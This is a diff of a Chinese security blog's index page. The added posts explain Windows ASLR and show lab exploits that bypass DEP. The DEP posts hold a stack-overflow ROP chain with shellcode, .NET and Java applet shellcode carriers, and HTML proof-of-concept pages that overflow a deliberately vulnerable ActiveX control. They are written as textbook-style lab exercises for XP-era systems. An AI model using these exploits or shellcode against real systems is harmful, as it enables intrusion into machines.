-<h3 id="2-动态测试技术"><a href="#2-动态测试技术" class="headerlink" title="2. 动态测试技术"></a>2. 动态测试技术</h3><h4 id="2-1-SPIKE"><a href="#2-1-SPIKE" class="headerlink" title="2.1 SPIKE"></a>2.1 SPIKE</h4><p>SPIKE是Protocol Fuzz(针对网络协议的模糊测试)工具<br><img src="/images/2017-07-28/block_data.jpg" alt="基于Block的数据定义方法"></p>
-<p>spike运行在linux环境下，当然对代码进行一定的修改之后就可以运行在windows上。<br>Dave Aitel实现了一套功能强大的API和数据结构用于定义数据块。SPIKE就是这样一套函数与数据结构的集合。</p>
-<p>Hello World用例：</p>
-<h4 id="2-2-beSTORM简介"><a href="#2-2-beSTORM简介" class="headerlink" title="2.2 beSTORM简介"></a>2.2 beSTORM简介</h4><p>由Beyond Security安全公司开发，运行在windows上的一款全能型安全审计程序，其利用模糊测试技术实现对网络协议的安全测试。</p>
-<h3 id="3-静态代码审计"><a href="#3-静态代码审计" class="headerlink" title="3. 静态代码审计"></a>3. 静态代码审计</h3><p>Coverity是用来提高软件质量的源代码静态分析工具。<br>Coverity使用checker模块来检测漏洞，默认情况下的checker包括：</p>
-<ol>
-<li>C checkers，内存错误、缓冲区溢出、函数的参数及返回值</li>
-<li>Concurrency checkers，线程同步、锁机制等</li>
-<li>Security checker，可信数据流的分析、字符串溢出等</li>
-</ol>
-<p>所有静态代码分析的理论和技术都面临的棘手问题：<br>如何处理程序逻辑中由动态因素引起的复杂条件分支和循环</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/18/攻击SEHOP的方法/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/07/18/攻击SEHOP的方法/" itemprop="url">攻击SEHOP的方法</a></h2>
+                <a class="post-title-link" href="/2017/07/18/0day/攻击SEHOP的方法/" itemprop="url">攻击SEHOP的方法</a></h2>
         
 
         <div class="post-meta">
@@ -3007,7 +622,7 @@ char shellcode[] =
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/17/SEHOP原理/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/17/0day/SEHOP原理/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Introspelliam">
@@ -3016,7 +631,7 @@ char shellcode[] =
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
+      <meta itemprop="name" content="Introspelliam">
     </span>
 
     
@@ -3026,7 +641,7 @@ char shellcode[] =
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/07/17/SEHOP原理/" itemprop="url">SEHOP原理</a></h2>
+                <a class="post-title-link" href="/2017/07/17/0day/SEHOP原理/" itemprop="url">SEHOP原理</a></h2>
         
 
         <div class="post-meta">
@@ -3230,7 +845,7 @@ if (process_flags & 0x40 == 0) {
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/14/攻击ASLR的方法/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/14/0day/攻击ASLR的方法/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Introspelliam">
@@ -3239,7 +854,7 @@ if (process_flags & 0x40 == 0) {
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
+      <meta itemprop="name" content="Introspelliam">
     </span>
 
     
@@ -3249,7 +864,7 @@ if (process_flags & 0x40 == 0) {
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/07/14/攻击ASLR的方法/" itemprop="url">攻击ASLR的方法</a></h2>
+                <a class="post-title-link" href="/2017/07/14/0day/攻击ASLR的方法/" itemprop="url">攻击ASLR的方法</a></h2>
         
 
         <div class="post-meta">
@@ -3733,11 +1348,2750 @@ if(((pCORHeader->MajorRuntimeVersion>2)|(pCORHeader->MajorRuntimeVerion == 2 && 
 
 
     
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/14/0day/内存随机化保护-ASLR-简介/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Introspelliam">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/07/14/0day/内存随机化保护-ASLR-简介/" itemprop="url">内存随机化保护(ASLR)简介</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-14T16:39:22+08:00">
+                2017-07-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全技术/" itemprop="url" rel="index">
+                    <span itemprop="name">安全技术</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>ASLR(Address Space Layout Randomization)技术就是通过加载程序的时候不再使用固定的基址加载，从而干扰shellcode定位的一种保护机制。</p>
+<p>支持ASLR的程序在其PE头中会设置IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识来说明其支持ASLR。从VS 2005 SP1开始加入/dynamicbase链接选项来帮我们完成这个任务。本书使用VS 2008(VS 9.0)中，通过Project-&gt;project Properties-&gt;Configuration Properties-&gt;Linker-&gt;Advanced-&gt;Randomized Base Address选项对/dynamicbase链接选项进行设置。</p>
+<p>ASLR一般分为映像随机化、堆栈随机化、PEB与TEB随机化</p>
+<h3 id="1-映像随机化"><a href="#1-映像随机化" class="headerlink" title="1. 映像随机化"></a>1. 映像随机化</h3><p>映像随机化是在PE文件映射到内存时，对其加载的虚拟地址进行随机化处理，这个地址在系统启动时确定，系统重启后该地址会变化。</p>
+<p>以IE为例<br><img src="/images/2017-07-14/aslr_image.jpg" alt="对比"></p>
+<p>系统中设置了映像随机化的开关，用户可以通过设置注册表中的HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\MoveImages的键值来设定映像随机化的工作模式</p>
+<ul>
+<li>0： 映像随机化被禁用</li>
+<li>-1： 强制对可随机化的映像进行处理，无论是否设置IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识</li>
+<li>其他值：正常工作模式，只对具有随机化处理标识的映像进行处理</li>
+</ul>
+<h3 id="2-堆栈随机化"><a href="#2-堆栈随机化" class="headerlink" title="2. 堆栈随机化"></a>2. 堆栈随机化</h3><p>在运行时随机的选择堆栈的基址，与映像基址随机化不同的是堆栈的基址不是在系统启动的时候确定的，而是在打开程序的时候确定的</p>
+<pre><code>
+int _tmain(int argc, _TCHAR* argv[])
+{
+    char * heap = (char *)malloc(100);
+    char stack[100];
+    printf("Address of heap:%#0.4x\nAddress of stack %#0.4x", heap, stack);
+    getchar();
+    return 0;
+}
+</code></pre>
+
+<p>使用win xp和win vista进行对比，如下：<br>win xp两次运行的结果：<br><img src="/images/2017-07-14/win_xp_heap_stack.jpg" alt="win_xp两次运行的结果"><br>win vista两次运行的结果：<br><img src="/images/2017-07-14/win_vista_heap_stack.jpg" alt="win_vista两次运行的结果"></p>
+<h3 id="3-PEB与TEB"><a href="#3-PEB与TEB" class="headerlink" title="3. PEB与TEB"></a>3. PEB与TEB</h3><p>PEB与TEB随机化在win xp sp2就引入了，不再使用固定的PEB基址0x7FFDF00和TEB基址0x7FFDE00</p>
+<font color="#f00">获取当前进程的TEB和PEB很简单，TEB存放在FS:0和FS:[0x18]处，PEB存放在TEB偏移0x30处的位置。获取TEB、PEB的方法如下：</font>
+
+<pre><code>
+int _tmain(int argc, _TCHAR* argv[])
+{
+    unsigned int teb;
+    unsigned int peb;
+    __asm{
+        mov eax, FS:[0x18]
+        mov teb, eax
+        mov eax, dword ptr [eax + 0x30]
+        mov peb, eax
+    }
+    printf("PEB:%#x\nTEB:%#x", peb, teb);
+    getchar();
+    return 0;
+}
+</code></pre>
+
+<p>PEB、TEB随机化测试:<br><img src="/images/2017-07-14/aslr_teb_peb.jpg" alt="PEB、TEB随机化"></p>
+<h3 id="4-ASLR存在的缺陷"><a href="#4-ASLR存在的缺陷" class="headerlink" title="4. ASLR存在的缺陷"></a>4. ASLR存在的缺陷</h3><ol>
+<li>映像随机化测试时各模块的入口点（Entry那列）地址的低位2个字节时不变的，也就是说映像随机化只是对加载基址的前2字节做了随机处理</li>
+<li>堆栈随机化可以防止精准攻击，但是使用JMP ESP跳板、浏览器攻击中的heap spray等技术是不需要精准跳转</li>
+<li>PEB与TEB的随机化的程度较差，而且即使做到完全随机，依然可以使用其他方法获取当前进程的PEB与TEB</li>
+</ol>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/12/0day/攻击DEP的方法-下/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Introspelliam">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/07/12/0day/攻击DEP的方法-下/" itemprop="url">攻击DEP的方法(下)——可执行内存、.Net、Java Applet</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-12T10:01:59+08:00">
+                2017-07-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全技术/" itemprop="url" rel="index">
+                    <span itemprop="name">安全技术</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="1-利用可执行内存"><a href="#1-利用可执行内存" class="headerlink" title="1. 利用可执行内存"></a>1. 利用可执行内存</h3><h4 id="1-1-实验代码"><a href="#1-1-实验代码" class="headerlink" title="1.1 实验代码"></a>1.1 实验代码</h4><pre><code>
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+char shellcode[] = 
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x8A\x17\x84\x7C"            // pop eax retn
+    "\x0B\x1A\xBF\x7C"            // pop pop retn
+    "\xBA\xD9\xBB\x7C"            // 修正EBP
+    "\x5F\x78\xA6\x7C"            // pop retn
+    "\x08\x00\x14\x00"            // 弹出机器码在可执行空间的起始地址，转入执行用
+    "\x00\x00\x14\x00"            // 可执行内存空间地址，复制用
+    "\xBF\x7D\xC9\x77"            // push esp jmp eax && 跳转至(pop pop retn地址)
+    "\xFF\x00\x00\x00"            // shellcode 长度
+    "\xAC\xAF\x94\x7C"            // memcpy入口
+    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
+    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
+    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
+    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
+    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
+    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
+    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
+    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";
+
+void test()
+{
+    char str[176];
+    //__asm int 3
+    memcpy(str, shellcode, 450);
+}
+
+int main()
+{
+    HINSTANCE hInst = LoadLibrary("shell32.dll");
+    char temp[200];
+    test();
+    return 0;
+}
+</code></pre>
+
+<h4 id="1-2-实验内容"><a href="#1-2-实验内容" class="headerlink" title="1.2 实验内容"></a>1.2 实验内容</h4><p><b>实验思路</b></p>
+<ol>
+<li>禁用GS和SafeSEH</li>
+<li>test存在溢出</li>
+<li>覆盖返回地址后，通过Ret2Libc技术，利用memcpy函数将shellcode复制到可读可写可执行区域</li>
+<li>最后在这段可执行的内存空间中执行shellcode，实现DEP的绕过</li>
+</ol>
+<p><b>实验环境</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows 2003 SP2</td>
+<td></td>
+</tr>
+<tr>
+<td>DEP状态</td>
+<td>Optout</td>
+<td></td>
+</tr>
+<tr>
+<td>编译器</td>
+<td>VC 6.0</td>
+<td></td>
+</tr>
+<tr>
+<td>编译选项</td>
+<td>禁用优化选项</td>
+<td></td>
+</tr>
+<tr>
+<td>build版本</td>
+<td>debug版本</td>
+</tr>
+</tbody>
+</table>
+<p>在OllyDbg中可以看出，在0x00140000的位置，Access和Initial Access都是RWE，这代表这一段是可读可写可执行的内存，长度为0x1000。</p>
+<ol>
+<li>源内存起始地址  <font color="#f00">[ebp+0xC]</font>，用push esp jmp eax指令地址来填充，push esp后这个位置会覆盖为当前esp，以实现源内存起始地址的动态获取</li>
+<li>复制字符串长度：0xFF  <font color="#f00">[ebp+0x10]</font></li>
+<li>目的地址0x00140000  <font color="#f00">[ebp+0x8]</font></li>
+</ol>
+<p>实验中，溢出字符串起始地址0x0012FDB0，返回地址0x0012FE68<br>pop eax retn地址:0x7C84178A<br>pop pop retn地址:0x7CBF1A0B(pop ebx pop edi retn)<br>修正EBP retn 4地址:0x7CBBD9BA(push esp pop ebp retn 4)<br>pop ecx retn地址:0x7CA6785F<br>push esp jmp eax地址:0x77C97DBF(用于跳转)<br>memcpy入口地址:0x7C94AFAC</p>
+<h3 id="2-利用-NET"><a href="#2-利用-NET" class="headerlink" title="2. 利用.NET"></a>2. 利用.NET</h3><p>实验支持:</p>
+<ol>
+<li>具有溢出漏洞的ActiveX控件</li>
+<li>包含shellcode的.NET控件</li>
+<li>可以触发ActiveX控件中溢出漏洞的POC页面</li>
+</ol>
+<h4 id="2-1-ActiveX控件"><a href="#2-1-ActiveX控件" class="headerlink" title="2.1 ActiveX控件"></a>2.1 ActiveX控件</h4><p>ActiveX控件</p>
+<pre><code>
+void CVulnerAX_DEPCtrl::test(LPCTSTR str)
+{
+    // AFX_MANAGE_STATE(AfxGetStaticModuleState());
+    // TODO: Add your dispatch handler code here
+    printf("aaaa");
+    char dest[100];
+    sprintf(dest, "%s", str);
+}
+</code></pre>
+
+<p><b>实验环境：</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td></td>
+</tr>
+<tr>
+<td>编译器</td>
+<td>Visual Studio 2008</td>
+<td></td>
+</tr>
+<tr>
+<td>优化</td>
+<td><font color="#f00">禁用优化选项</font></td>
+<td></td>
+</tr>
+<tr>
+<td>MFC</td>
+<td>在静态库中使用MFC</td>
+<td>工程属性-&gt;General-&gt;Use of MFC</td>
+</tr>
+<tr>
+<td>字符集</td>
+<td>使用Unicode字符集</td>
+<td>工程属性-&gt;General-&gt;Character Set</td>
+</tr>
+<tr>
+<td>build版本</td>
+<td>release版本</td>
+</tr>
+</tbody>
+</table>
+<p>编译好控件之后，在实验机器上注册该ActiveX控件.regsvr32</p>
+<h4 id="2-2-包含shellcode的-NET控件"><a href="#2-2-包含shellcode的-NET控件" class="headerlink" title="2.2 包含shellcode的.NET控件"></a>2.2 包含shellcode的.NET控件</h4><font color="#f00">在VS2008中C#下边建立一个DLL解决方案</font>
+
+<p><img src="/images/2017-07-12/net.jpg" alt="C#下建立的DLL解决方案"></p>
+<p>包含shellcode的.NET控件代码</p>
+<pre><code>
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+
+namespace DEP_NETDLL
+{
+    public class Class1
+    {
+        public void Shellcode()
+        {
+            string shellcode = 
+                "\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090" +
+                "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91" +
+                "\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332" +
+                "\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c" +
+                "\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505" +
+                "\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b" +
+                "\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06" +
+                "\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c" +
+                "\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd" +
+                "\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33" +
+                "\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050" +
+                "\uff53\ufc57\uff53\uf857";
+        }
+    }
+}
+
+</code></pre>
+
+<p><b>实验环境：</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td></td>
+</tr>
+<tr>
+<td>编译器</td>
+<td>Visual Studio 2008</td>
+<td></td>
+</tr>
+<tr>
+<td>基址</td>
+<td>0x24240000</td>
+<td></td>
+</tr>
+<tr>
+<td>build版本</td>
+<td>Debug版本</td>
+<td>Release版本的优化会影响shellcode</td>
+</tr>
+</tbody>
+</table>
+<p>设置DLL的基址方法如下：&quot;Project-&gt;Properties-&gt;Build-&gt;Advanced&quot;<br><img src="/images/2017-07-12/set_dll_address.jpg" alt="设置DLL基址"></p>
+<h4 id="2-3-POC及测试"><a href="#2-3-POC及测试" class="headerlink" title="2.3 POC及测试"></a>2.3 POC及测试</h4><p>编译好DLL之后，需要将DLL和溢出ActiveX控件的POC页面放到同一目录下，并通过如下调试代码调用</p>
+<pre><code>&lt;object classID="DEP_NETDLL.dll#DEP_NETDLL.Shellcode"&gt;&lt;/object&gt;
+</code></pre>
+
+<p>Shellcode设置好后，就来设置POC页面，并将POC页面与.NET控件放到一台WEB服务器上，在实验机上访问这个POC页面，以触发ActiveX中的溢出漏洞，通过.NET控件绕过DEP。</p>
+<p>POC页面如下</p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;object classID=&quot;DEP_NETDLL.dll#DEP_NETDLL.Class1&quot;&gt;&lt;/object&gt;
+&lt;object classid=&quot;clsid:053CC2BD-8E24-4E01-A950-9FF689F40487&quot; id=&quot;test&quot;&gt;&lt;/object&gt;
+&lt;script&gt;
+var s = &quot;\u9090&quot;;
+while(s.length &lt; 54){
+    s += &quot;\u9090&quot;;
+}
+s += &quot;\u24E2\u2424&quot;;
+test.test(s);
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p><b>实验解释：</b></p>
+<ol>
+<li>为了简单地反映绕过DEP的过程，本实验所攻击的ActiveX控件不启用GS</li>
+<li>通过web页面同时加载具有溢出漏洞的ActiveX控件和包含shellcode的.NET控件</li>
+<li>ActiveX控件中的test函数存在典型的溢出</li>
+<li>编译.NET控件的时候，我们设置DLL的基址，所以我们将函数的返回地址覆盖为.NET控件中的shellcode起始地址，进而转入shellcode执行</li>
+<li>实验使用Unicode编码，在计算填充长度时要考虑Unicode与Ascii编码之间的长度差问题</li>
+</ol>
+<p><b>实验环境：</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td></td>
+</tr>
+<tr>
+<td>DEP</td>
+<td>Optout</td>
+<td></td>
+</tr>
+<tr>
+<td>浏览器</td>
+<td>IE6</td>
+</tr>
+</tbody>
+</table>
+<p>当弹出下面所示对话框时用OllyDbg附加IE的进程，附加好后按一下F9键让程序继续运行。<br><img src="/images/2017-07-12/ie.jpg" alt="对话框"></p>
+<p>然后转到DEP_NETDLL.dll的内存空间中查找shellcode的具体位置，然后进入该内存空间。</p>
+<p>shellcode的起始地址0x242424DF。而我们填充的字符串起始地址0x01EFF534，函数返回地址0x01EFF5A0，所以填充108（0x6C）字节就可以覆盖返回地址。</p>
+<font color="#f00">令人意外的是，我们无法包含dll文件，使用了所有可能的办法，都无法在html中使用dll</font>
+
+<h3 id="3-利用java-applet"><a href="#3-利用java-applet" class="headerlink" title="3. 利用java applet"></a>3. 利用java applet</h3><p>实验支持:</p>
+<ol>
+<li>具有溢出漏洞的ActiveX控件</li>
+<li>包含shellcode的Java Applet控件</li>
+<li>可以触发ActiveX控件中溢出漏洞的POC页面</li>
+</ol>
+<h4 id="3-1-ActiveX控件"><a href="#3-1-ActiveX控件" class="headerlink" title="3.1 ActiveX控件"></a>3.1 ActiveX控件</h4><p>上一讲已经介绍</p>
+<h4 id="3-2-包含shellcode的Java-Applet控件"><a href="#3-2-包含shellcode的Java-Applet控件" class="headerlink" title="3.2 包含shellcode的Java Applet控件"></a>3.2 包含shellcode的Java Applet控件</h4><p>实验代码</p>
+<pre><code>
+import java.applet.*;
+import java.awt.*;
+public class Shellcode extends Applet{
+    public void init(){
+        Runtime.getRuntime().gc();
+        StringBuffer buffer = new StringBuffer(255);
+        buffer.append("\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090" +
+                "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91" +
+                "\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332" +
+                "\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c" +
+                "\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505" +
+                "\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b" +
+                "\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06" +
+                "\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c" +
+                "\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd" +
+                "\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33" +
+                "\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050" +
+                "\uff53\ufc57\uff53\uf857");
+    }
+}
+</code></pre>
+
+<p>编译成class文件后，在Web中通过如下代码调用<br>    <applet code="class文件名.class"></applet></p>
+<p><b>实验环境：</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td></td>
+</tr>
+<tr>
+<td>Java JDK</td>
+<td>1.4.2</td>
+<td></td>
+</tr>
+<tr>
+<td>目标版本</td>
+<td>1.1</td>
+<td>脱离JRE，在不具有JRE机器上也能执行</td>
+</tr>
+<tr>
+<td>编译指令</td>
+<td>javac 路径\Shellcode.java -target 1.1</td>
+</tr>
+</tbody>
+</table>
+<h4 id="3-3-POC及其利用"><a href="#3-3-POC及其利用" class="headerlink" title="3.3 POC及其利用"></a>3.3 POC及其利用</h4><p>编译产生的Shellcode.class与POC放到同一目录下</p>
+<p>POC页面代码</p>
+<pre><code>
+&lt;html&gt;
+&lt;body&gt;
+&lt;applet code=Shellcode.class width=300 height=50&gt;&lt;/applet&gt;
+&lt;script&gt;alert("开始溢出:");&lt;/script&gt;
+&lt;object classid="clsid:053CC2BD-8E24-4E01-A950-9FF689F40487" id="test"&gt;&lt;/object&gt;
+&lt;script&gt;
+var s = "\u9090";
+while(s.length &lt; 54){
+    s += "\u9090";
+}
+s += "\u04FC\u1001";
+test.test(s);
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>代码解释:</p>
+<ol>
+<li>ActiveX不使用GS</li>
+<li>通过Web页面同时加载具有溢出漏洞的ActiveX控件和包含shellcode的Java applet控件</li>
+<li>java applet的内存空间中具有可执行权限，所以我们的shellcode有执行的机会</li>
+<li>ActiveX控件中的test函数存在典型的溢出</li>
+<li>将函数的返回地址覆盖为Java Applet中的.text段的shellcode起始地址，进而转入shellcoe中执行</li>
+<li>实验用Unicode编码，需要考虑Unicode与Ascii之间的转换</li>
+</ol>
+<p><b>实验环境：</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td></td>
+</tr>
+<tr>
+<td>DEP状态</td>
+<td>Optout</td>
+<td></td>
+</tr>
+<tr>
+<td>JRE状态</td>
+<td>启用</td>
+<td></td>
+</tr>
+<tr>
+<td>Java JDK</td>
+<td>1.4.2</td>
+<td>不要使用高版本的JRE，否则Java applet申请的内存不在IE进程中</td>
+</tr>
+<tr>
+<td>浏览器</td>
+<td>IE6</td>
+</tr>
+</tbody>
+</table>
+<p>在浏览器中启用JRE：Internet选项-&gt;高级-&gt;Java-&gt;将Java……用于&lt;applet&gt;</p>
